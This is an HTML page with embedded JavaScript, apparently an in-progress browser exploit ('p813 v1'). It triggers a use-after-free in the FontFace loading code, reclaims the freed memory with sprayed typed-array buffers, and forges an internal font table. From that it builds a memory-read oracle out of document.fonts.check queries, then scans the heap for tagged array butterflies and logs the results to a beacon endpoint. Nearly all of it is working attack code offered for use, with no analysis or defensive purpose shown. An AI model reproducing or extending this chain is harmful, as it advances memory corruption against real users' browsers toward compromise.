<!--
  p813 v1: Butterfly discovery + read oracle foundation

  Goal: Find butterfly allocations near SELF, verify ownership via markers,
  map adjacency to spray buffers, and validate read oracle on known addresses.

  Flow: UAF → spray → oracle → SELFIDX (ptrElim) → RS → BF scan → verify → adjacency → read test

  Params: ?k=32 (spray count) &pw=80 (pause ms) &bsn=512 (butterfly scan radius)
  Budget: ~22K oracle calls (RS ~21K + BF scan ~1K)
  CRASH_CLASS: LOW (heap reads via oracle, no writes to foreign objects)
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p813 BF Discovery</title></head>
<body>
<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
<pre id="out" style="font:11px monospace;white-space:pre-wrap">p813 v1 — butterfly discovery + read oracle</pre>
<script>
'use strict';
var O=document.getElementById('out');
var UID=Math.random().toString(36).slice(2,8).toUpperCase();

function b(m){try{O.textContent+='\n'+m;}catch(e){}
  try{navigator.sendBeacon('/beacon/P813-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID);}catch(e){}}
function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P813-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}

function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
var K=qint('k',32), PW=qint('pw',80), BSCAN_N=qint('bsn',512);
var SIZE=192, fired=false, faces=null;

/* --- helpers --- */
function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
function hex(x){if(typeof x==='bigint')return '0x'+x.toString(16);return '0x'+x.toString(16);}
function mkDouble(lo32,hi32){var ab=new ArrayBuffer(8);var dv=new DataView(ab);dv.setUint32(0,lo32,true);dv.setUint32(4,hi32,true);return dv.getFloat64(0,true);}

/* ============================================================
   PRE-UAF: Butterfly spray (23-element double arrays → 192B)
   ============================================================ */
var BF_COUNT=200, BF_ELEMS=23;
var bfArrays=[];
for(var bi=0;bi<BF_COUNT;bi++){
  var arr=new Array(BF_ELEMS);
  for(var bj=0;bj<BF_ELEMS;bj++) arr[bj]=1.1+bi*0.001+bj*0.0001;
  bfArrays.push(arr);
}
for(var bm=0;bm<BF_COUNT;bm++){
  bfArrays[bm][0]=mkDouble(0,0xB000+bm);
  bfArrays[bm][1]=mkDouble(0,0xC000+bm);
}
b('BF-PRE-'+BF_COUNT+'x'+BF_ELEMS);

/* PRE-UAF: Target buffers with known marker */
var TGT_COUNT=128;
var targets=[];
for(var ti=0;ti<TGT_COUNT;ti++){
  var tb=new Uint8Array(new ArrayBuffer(SIZE));
  put32(tb,0,0xA000); put32(tb,4,0xB000);
  put32(tb,8,0x812A0000|ti); put32(tb,12,0xFACE0812);
  targets.push(tb);
}
b('TGT-'+TGT_COUNT+'x'+SIZE+'B');

/* --- crash-loop guard --- */
var CK='p813v1_tries';
var MAX_TRIES=15,tries=0;
try{tries=parseInt(localStorage.getItem(CK)||'0',10);}catch(e){}
var GUARD_HALT=false;
if(tries>=MAX_TRIES){GUARD_HALT=true;b('LOOP-GUARD-'+tries);verd('bad','CRASH LOOP ('+tries+')');
  setTimeout(function(){try{localStorage.removeItem(CK);}catch(e){}location.replace('/?_='+Date.now());},8000);}
else{
  try{localStorage.setItem(CK,String(tries+1));}catch(e){}
  b('VER-P813v1');b('BOOT-'+UID+',try='+(tries+1)+',bsn='+BSCAN_N);
}

/* ============================================================
   PHASE 1: UAF trigger + spray
   ============================================================ */
function start(){
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);

  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SIZE));
      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});

  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
                                               function(e){b('RJ-'+String(e&&e.name));});
  setTimeout(function(){if(!faces)b('NOFACES');},1500);
}

/* ============================================================
   PHASE 2: Oracle setup + self-scan
   ============================================================ */
function phase(){
  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null;

  for(var i=0;i<window.__sp.length;i++){
    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
    if(a>0x1000000000n){
      bufs.push([window.__sp[i],c]);bufl1.push(a);
      if(!rawL) rawL=[a,c];
    }
  }
  if(rawL){L1=rawL[0];L2=rawL[1];}
  b('L1-'+hex(L1));b('L2-'+hex(L2));
  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},3000);return;}

  /* forge for oracle mode — ALL spray bufs */
  var forgeL2=(bufs.length>0)?bufs[0][1]:L2;
  for(var ib=0;ib<window.__sp.length;ib++){
    var vb=window.__sp[ib];
    vb[0]=0; vb[3]=0; put64(vb,0x08,forgeL2); vb[0x10]=0; vb[0x82]=0;
  }
  b('FORGED-'+bufs.length+'/'+window.__sp.length);

  setTimeout(function(){
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    b('FAMILY-OK');
    setTimeout(function(){
      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
      b('ADD-OK');
      setTimeout(function(){
        var fam=null,zi=-1;
        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
        b('INTABLE-'+fam);
        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
        for(var is2=0;is2<window.__sp.length;is2++){window.__sp[is2][0x28]=1;window.__sp[is2][0x2C]=1;}

        /* --- oracle functions --- */
        var self=0n,selfFound=false;
        var SKIPJ=-1;
        function setR(t){for(var ir=0;ir<window.__sp.length;ir++){if(SKIPJ>=0&&ir===SKIPJ)continue;put64(window.__sp[ir],0x20,t);}}
        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
        function boundary(tgt){
          setR(tgt);
          if(chk(0)!==true)return -1;
          var lo=0,hi=0x10FFFF,res=-1;
          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
          return res;
        }

        /* --- oracle validation --- */
        var t1=-1,l2i=-1,oracleOff=0n;
        var OO_A=[];for(var oa=0;oa<=0x38;oa+=4)OO_A.push(BigInt(oa));
        var OO_U=[0x05n,0x07n,0x0Bn,0x0Fn,0x13n,0x17n,0x1Bn,0x1Fn,0x23n,0x27n];
        var OO_ALL=OO_A.concat(OO_U);
        for(var q8=0;q8<bufs.length&&t1<0;q8++){
          L1=bufl1[q8];L2=bufs[q8][1];
          for(var oi=0;oi<OO_ALL.length;oi++){
            setR(L2+OO_ALL[oi]);
            if(chk(0)===true){t1=boundary(L2+OO_ALL[oi]);if(t1>=0){oracleOff=OO_ALL[oi];l2i=q8;break;}}
          }
        }
        if(l2i>0)b('L2SEL-'+l2i);
        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
        var oracleAlive=(t1>=0);
        for(var ipd=0;ipd<window.__sp.length;ipd++){var vpd=window.__sp[ipd];
          vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
          vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
        if(!oracleAlive){b('A-DEAD');verd('bad','ORACLE DEAD — retry');
          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);return;}
        b('ORACLE-ALIVE-off='+hex(oracleOff));

        /* --- Phase SELFIDX: identify which __sp[] IS the font-table buffer --- */
        var selfIdx=-1;
        if(oracleAlive && t1>=0){
          setR(L2+oracleOff);
          var bline=chk(t1);
          bs('SD-bl='+bline+',t1='+t1+',off='+hex(oracleOff));

          /* global kill: ALL size=0 → does oracle change? */
          for(var gk=0;gk<window.__sp.length;gk++)put32(window.__sp[gk],0x28,0);
          var gkR=chk(t1);
          for(var gk2=0;gk2<window.__sp.length;gk2++)put32(window.__sp[gk2],0x28,1);
          bs('SD-gk='+gkR);

          if(bline===true){
            /* Method 1: size elimination (only if global kill proves it works) */
            if(gkR!==bline){
              for(var sij=0;sij<window.__sp.length&&selfIdx<0;sij++){
                put32(window.__sp[sij],0x28,0);
                var tst=chk(t1);
                put32(window.__sp[sij],0x28,1);
                if(tst!==bline)selfIdx=sij;
              }
              bs('SD-szM='+selfIdx);
            }
            /* Method 2: buffer-pointer elimination (fallback) */
            if(selfIdx<0){
              var altOff=(oracleOff===0n)?4n:0n;
              setR(L2+altOff);
              var altBl=chk(t1);
              setR(L2+oracleOff);
              bs('SD-alt='+altBl);
              if(altBl!==bline){
                for(var sij2=0;sij2<window.__sp.length&&selfIdx<0;sij2++){
                  put64(window.__sp[sij2],0x20,L2+altOff);
                  var tst2=chk(t1);
                  put64(window.__sp[sij2],0x20,L2+oracleOff);
                  if(tst2!==bline)selfIdx=sij2;
                }
                bs('SD-ptrM='+selfIdx);
              }
            }
          }
          b('SELFIDX-'+selfIdx);
        }

        /* --- Phase RS: range scan with unique SELF signature --- */
        var n3=0;
        if(!selfFound && selfIdx>=0){
          window.__sp[selfIdx][0x38]=0xEF;window.__sp[selfIdx][0x39]=0xBE;
          window.__sp[selfIdx][0x3A]=0x00;window.__sp[selfIdx][0x3B]=0x00;
          window.__sp[selfIdx][0x3C]=0xAD;window.__sp[selfIdx][0x3D]=0xDE;
          window.__sp[selfIdx][0x3E]=0x00;window.__sp[selfIdx][0x3F]=0x00;
          var rsMin=L1<L2?L1:L2,rsMax=L1>L2?L1:L2;
          var rsHi=rsMax&(~0xFn);
          var rsLo=rsMin-0x800000n;if(rsLo<0x1000000000n)rsLo=0x1000000000n;
          rsLo=rsLo&(~0xFn);
          var rsEst=Number((rsHi-rsLo)/0x10n);
          bs('RS-'+hex(rsHi)+'-'+hex(rsLo)+',n='+rsEst);
          for(var rsa=rsHi;rsa>=rsLo&&!selfFound;rsa-=0x10n){
            put64(window.__sp[selfIdx],0x20,rsa+0x38n);
            n3++;
            if(chk(0xBEEF)===true){
              if(chk(0xBEEE)===false&&chk(0xDEAD)===true&&chk(0xDEAE)===false){
                self=rsa;selfFound=true;
                b('SELF-RS-'+hex(self));
              }
            }
            if(n3%131072===0)bs('RS-p-'+n3);
          }
          window.__sp[selfIdx][0x38]=0x00;window.__sp[selfIdx][0x39]=0x10;
          window.__sp[selfIdx][0x3A]=0x00;window.__sp[selfIdx][0x3B]=0x00;
          window.__sp[selfIdx][0x3C]=0x00;window.__sp[selfIdx][0x3D]=0x20;
          window.__sp[selfIdx][0x3E]=0x00;window.__sp[selfIdx][0x3F]=0x00;
          if(!selfFound)bs('RS-MISS-'+n3);
        }

        if(!selfFound){
          b('NOSELF-'+n3);verd('bad','NOSELF '+n3);
          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);
          return;
        }
        b('SELF-'+hex(self)+',n3='+n3);

        if(bufs.length>1){
          var sjt=boundary(self);
          if(sjt>=0x1000&&sjt<0x1000+K){SKIPJ=sjt-0x1000;}
        }
        b('SKIPJ-'+SKIPJ);
        for(var ir2=0;ir2<window.__sp.length;ir2++){if(SKIPJ>=0&&ir2===SKIPJ)continue;put64(window.__sp[ir2],0x20,self+0x38n);}

        /* ============================================================
           PHASE BF: Butterfly discovery scan
           Scan ±BSCAN_N slots for our marked butterfly element 0
           ============================================================ */
        bs('BF-SCAN-START,bsn='+BSCAN_N+',stride='+SIZE);
        var STRIDE=SIZE;
        var bfHits=[];
        var bfCalls=0;

        for(var bsn=-BSCAN_N;bsn<=BSCAN_N;bsn++){
          if(bsn===0)continue;
          var elemAddr=self+BigInt(bsn*STRIDE)+8n;
          var bnd=boundary(elemAddr);
          bfCalls++;
          if(bnd>=0xB000&&bnd<0xB000+BF_COUNT){
            var bfIdx=bnd-0xB000;
            var bfAddr=self+BigInt(bsn*STRIDE);
            bfHits.push({slot:bsn,bfIdx:bfIdx,addr:bfAddr});
            bs('BF-HIT:slot='+bsn+',idx='+bfIdx+',addr='+hex(bfAddr));
          }
          if(bfCalls%256===0)bs('BF-p-'+bfCalls+',s='+bsn);
        }
        bs('BF-SCAN-DONE,hits='+bfHits.length+',calls='+bfCalls);

        /* ============================================================
           PHASE BV: Butterfly verification
           Verify element 1 marker on up to 30 hits
           ============================================================ */
        var verified=[];
        var verLimit=Math.min(bfHits.length,30);
        for(var bvi=0;bvi<verLimit;bvi++){
          var hit=bfHits[bvi];
          var elem1Addr=hit.addr+16n;
          var v1=boundary(elem1Addr);
          var expected=0xC000+hit.bfIdx;
          var pass=(v1===expected);
          if(pass)verified.push(hit);
          bs('BF-VER:slot='+hit.slot+',idx='+hit.bfIdx+','+(pass?'OK':'FAIL:'+v1));
        }
        bs('BF-VER-DONE,ver='+verified.length+'/'+verLimit);

        /* ============================================================
           PHASE ADJ: Adjacency analysis
           ============================================================ */
        bfHits.sort(function(a2,b2){return a2.slot-b2.slot;});
        var adjBFcount=0;
        for(var adi=0;adi<bfHits.length-1;adi++){
          if(bfHits[adi+1].slot-bfHits[adi].slot===1){
            adjBFcount++;
            bs('ADJ-BF:'+bfHits[adi].bfIdx+'@'+bfHits[adi].slot+'+'+bfHits[adi+1].bfIdx+'@'+bfHits[adi+1].slot);
          }
        }
        bs('ADJ-BF-TOTAL:'+adjBFcount);

        var spAdjCount=0;
        for(var sai=0;sai<bfHits.length;sai++){
          var saSlot=bfHits[sai].slot;
          var saBfIdx=bfHits[sai].bfIdx;
          var prevAddr=self+BigInt((saSlot-1)*STRIDE);
          var nextAddr=self+BigInt((saSlot+1)*STRIDE);
          var prevBnd=boundary(prevAddr);
          var nextBnd=boundary(nextAddr);
          if(prevBnd>=0x1000&&prevBnd<0x1000+K){
            spAdjCount++;
            bs('SP-ADJ:sp'+(prevBnd-0x1000)+'@'+(saSlot-1)+'+bf'+saBfIdx+'@'+saSlot);
          }
          if(nextBnd>=0x1000&&nextBnd<0x1000+K){
            spAdjCount++;
            bs('SP-ADJ:bf'+saBfIdx+'@'+saSlot+'+sp'+(nextBnd-0x1000)+'@'+(saSlot+1));
          }
        }
        bs('SP-ADJ-TOTAL:'+spAdjCount);

        /* ============================================================
           PHASE RD: Read primitive test
           ============================================================ */
        var rd1=boundary(self+0x38n);
        bs('RD-SELF38:'+rd1);

        if(bfHits.length>0){
          var hdrBnd=boundary(bfHits[0].addr);
          bs('RD-BFHDR:'+hdrBnd);
        }

        /* ============================================================
           FINAL: Summary and verdict
           ============================================================ */
        try{localStorage.removeItem(CK);}catch(e){}

        bs('RESULT:SELF='+hex(self)+',BF='+bfHits.length+',ver='+verified.length+',adj='+adjBFcount+',spAdj='+spAdjCount);

        var html='BF found: '+bfHits.length+', verified: '+verified.length+', BF-adjacent: '+adjBFcount+', spray-adjacent: '+spAdjCount;
        verd((verified.length>0)?'ok':'bad',html);

      },60);
    },40);
  },60);
}

if(!GUARD_HALT){
if(document.readyState==='complete'||document.readyState==='interactive')
  setTimeout(start,2000);
else document.addEventListener('DOMContentLoaded',function(){setTimeout(start,2000);});
}
</script></body></html>
